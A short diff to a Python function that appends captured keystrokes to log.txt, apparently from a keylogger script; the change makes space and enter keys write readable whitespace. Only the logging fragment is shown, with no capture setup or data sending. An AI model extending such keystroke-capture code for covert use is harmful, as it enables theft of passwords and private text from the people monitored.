@@ -8,7 +8,9 @@ def write_file(keys):
     with open("log.txt", mode="a") as f:
         for key in keys:
             k = str(key).replace("'", "")
-            if k.find("space") > 0:
+            if k == "Key.space":
+                f.write(" ")
+            elif k == "Key.enter":
                 f.write("\n")
             elif k.find("Key") == -1:
                 f.write(k)
